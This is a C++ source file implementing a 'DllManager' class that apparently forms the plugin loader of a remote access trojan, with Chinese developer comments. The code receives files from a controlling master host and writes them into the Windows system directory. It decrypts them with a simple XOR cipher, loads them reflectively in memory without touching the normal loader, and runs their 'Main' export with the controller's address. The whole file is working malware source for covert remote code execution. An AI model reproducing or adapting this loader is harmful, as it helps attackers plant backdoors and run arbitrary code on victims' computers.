// DllManager.cpp: implementation of the CDllManager class.
//
//////////////////////////////////////////////////////////////////////

#include "StdAfx.h"
#include "DllManager.h"
#include "KernelManager.h"
#include "MemLoadDll.h"

typedef struct
{
	DWORD	dwSizeHigh1;
	DWORD	dwSizeLow1;
}FILESIZEDLL;

HMEMORYMODULE hdllmod;
extern HANDLE hNewThreadInitializedEvent;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CDllManager::CDllManager(CClientSocket *pClient, LPBYTE lparam/*, DWORD dwDataSize*/):CManager(pClient)
{
	char *lpDllName;
	DWORD dwDllNameLen = strlen((char*)(lparam + 4)) +1;
	if(dwDllNameLen == 0)
		return ;
	lpDllName = (char *)malloc(dwDllNameLen);
	memcpy(lpDllName, lparam + 4, dwDllNameLen);
	strcpy(m_strCurrentProcessFileName, lpDllName);
	free(lpDllName);
	DWORD dwDataSize;
	memcpy(&dwDataSize, lparam, 4);
	LPBYTE token;
	token = (LPBYTE)LocalAlloc(LPTR, 1 + 4 + dwDllNameLen + dwDataSize);
	m_dwDataSize = dwDataSize;
	token[0] = TOKEN_DLLMAIN;
	memcpy(token + 1 , lparam , 4 + dwDllNameLen + dwDataSize);
	SetEvent(hNewThreadInitializedEvent);
	Send(token, 1 + 4 + dwDllNameLen + dwDataSize);
	LocalFree(token);
// 	puts("以获得开始加载DLL消息");
//	MessageBox(NULL, "1", "", NULL);
}

CDllManager::~CDllManager()
{
}

void CDllManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_DLLOK:
		{
// 			puts("允许加载DLL");
			LoadLib(lpBuffer+1);
// 			puts("加载DLL完毕");
		}
		break;
	case COMMAND_DLLVERSION:
		{
			Sleep(80);
// 			puts("发送版本");
			SendDllVersion(m_strCurrentProcessFileName);;
		}
		break;
	case COMMAND_FILE_DATA:
		WriteLocalRecvFile(lpBuffer + 1, nSize -1);
		break;
	case COMMAND_FILE_SIZE:
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	default:
		break;
	}
}

void DecryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key) //解密
{
	unsigned long i;
	unsigned char p;
	
	p = (unsigned char ) key % 1451 + 61;
	
	for(i = 0; i < nLen; i++) 
	{
		*szRec ^= p;
		*szRec += p;
		szRec++;
	}
}

int CDllManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

LPBYTE CDllManager::getDllVersion(LPCTSTR lpDllName)
{
	LPBYTE	lpBuffer = NULL;
	DWORD	dwOffset = 0;
	DWORD	dwLength = 0;
	
	char	strSysPath[MAX_PATH];
	GetSystemDirectory(strSysPath, MAX_PATH);
	strcat(strSysPath, "\\");
	strcat(strSysPath, lpDllName);
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	
	if(GetFileAttributes(strSysPath) != -1)
	{
		hDllFile = CreateFile(strSysPath,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
		if (hDllFile == INVALID_HANDLE_VALUE)
		{
			//OutputDebugStringA("打开文件失败");
		}
		SizeDll  = GetFileSize(hDllFile,0);
		if (!SizeDll == 0)
		{
			//OutputDebugStringA("获得大小成功");
		}
		
		MemDll = malloc(SizeDll);
		if (!MemDll == 0)
		{
			//OutputDebugStringA("申请内存成功");
		}
		if (ReadFile(hDllFile,MemDll,SizeDll,&BytesRead,0)==TRUE)
		{
			//OutputDebugStringA("读入数据成功");
		}
		CloseHandle(hDllFile);
		DecryptPlug((unsigned char *)MemDll,SizeDll,1024);
		typedef char * (* DLLVERSION)();
		hdllmod = ::MemoryLoadLibrary(MemDll);
		free(MemDll);
		if(hdllmod != NULL)
		{
			char strdllversion[256]={0};
			DLLVERSION lpproc;
			lpproc = (DLLVERSION)MemoryGetProcAddress (hdllmod,"Version");
			if(lpproc != NULL)
				strcpy(strdllversion ,(char *)(*lpproc)());
			MemoryFreeLibrary(hdllmod);	
			////发送服务版本
			lpBuffer[0] = TOKEN_DLLVERSION;
			dwOffset = 1;
			
			memcpy(lpBuffer + dwOffset, strdllversion, lstrlen(strdllversion) + 1);
			dwOffset += lstrlen(strdllversion) + 1;
			
			memcpy(lpBuffer + dwOffset, lpDllName, lstrlen(lpDllName) + 1);
			dwOffset += lstrlen(lpDllName) + 1;
			
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
			return lpBuffer;
		}
	}
	//加载失败，要求重传
	lpBuffer[0] = TOKEN_DLLLOADERROR;
	dwOffset = 1;
	memcpy(lpBuffer + dwOffset, lpDllName, lstrlen(lpDllName) + 1);
	dwOffset += lstrlen(lpDllName) + 1;
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	return lpBuffer;
}

void CDllManager::SendDllVersion(LPCTSTR lpDllName)
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getDllVersion(lpDllName);
	if (lpBuffer == NULL)
		return;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CDllManager::LoadLib(LPBYTE xlparam)
{
	char *lpDllName;
	int nDllLength = strlen((char*)(xlparam +4)) +1 ;
	if(nDllLength == 0)
		return ;
	lpDllName = (char *)malloc(nDllLength);
	memcpy(lpDllName,xlparam +4 , nDllLength );
	
	char strSysPath[MAX_PATH];
	GetSystemDirectory(strSysPath, MAX_PATH);
	strcat(strSysPath, "\\");
	strcat(strSysPath, lpDllName);
	free(lpDllName);
	
	if(GetFileAttributes(strSysPath) != -1)
	{
		hDllFile =CreateFile(strSysPath,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);//这里第一个参数调用上面那个GetModuleFileName
		SizeDll  =GetFileSize(hDllFile,0);
		MemDll   =VirtualAlloc(0,SizeDll,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
		ReadFile(hDllFile,MemDll,SizeDll,&BytesRead,0);
		CloseHandle(hDllFile);
		DecryptPlug((unsigned char *)MemDll,SizeDll,1024);
		typedef void (* DLLMain)(LPCTSTR strHost, UINT HostPort, LPBYTE xlparam);
		hdllmod = ::MemoryLoadLibrary(MemDll);
		VirtualFree(MemDll,0,MEM_RELEASE);
		if(hdllmod != NULL)
		{
			DLLMain lpproc;
			lpproc = (DLLMain)MemoryGetProcAddress(hdllmod,"Main");
			//puts("准备加载");
			if(lpproc!=NULL)
			{
				//puts("加载成功");
				SendToken(TOKEN_DLLOK);
				(*lpproc)(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort, xlparam);
			}
			MemoryFreeLibrary(hdllmod);
			return;
		}
	}
	// puts("Error");
	SendToken(TOKEN_DLLLOADERROR);
}

void CDllManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// 传输完毕
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9

	FILESIZEDLL	*pFileSize;
	// 得到数据的偏移
	pData = lpBuffer + 8;
	
	pFileSize = (FILESIZEDLL *)lpBuffer;
	
	// 得到数据在文件中的偏移
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh1;
	LONG	dwOffsetLow = pFileSize->dwSizeLow1;
	
	dwBytesToWrite = nSize - 8;
	char strSysPath[MAX_PATH];
	GetSystemDirectory(strSysPath, MAX_PATH);
	strcat(strSysPath, "\\");
	strcat(strSysPath, m_strCurrentProcessFileName);
	HANDLE	hFile = 
		CreateFile
		(
		strSysPath,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int nRet = 0;
	// 写入文件
	nRet = WriteFile
		(
		hFile,
		pData, 
		dwBytesToWrite, 
		&dwBytesWrite,
		NULL
		);
	// 	if (nRet <= 0)
	// 		printf("文件写入失败");
	CloseHandle(hFile);
	// 为了比较，计数器递增
	
	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	dwOffsetLow += dwBytesWrite;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
}

void CDllManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZEDLL	*pFileSize = (FILESIZEDLL *)lpBuffer;
	// 保存文件长度
	m_nCurrentProcessFileLength = ((__int64)pFileSize->dwSizeHigh1 << 32) + pFileSize->dwSizeLow1;

	GetFileData();
}

void CDllManager::GetFileData()
{
	int	nTransferMode = TRANSFER_MODE_OVERWRITE;
	
	//  1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	char		strSysPath[MAX_PATH];
	GetSystemDirectory(strSysPath, MAX_PATH);
	strcat(strSysPath, "\\");
	strcat(strSysPath, m_strCurrentProcessFileName);
	HANDLE	hFile = 
		CreateFile
		(
		strSysPath,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// 需要错误处理
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	CloseHandle(hFile);

	Send(bToken, sizeof(bToken));
}
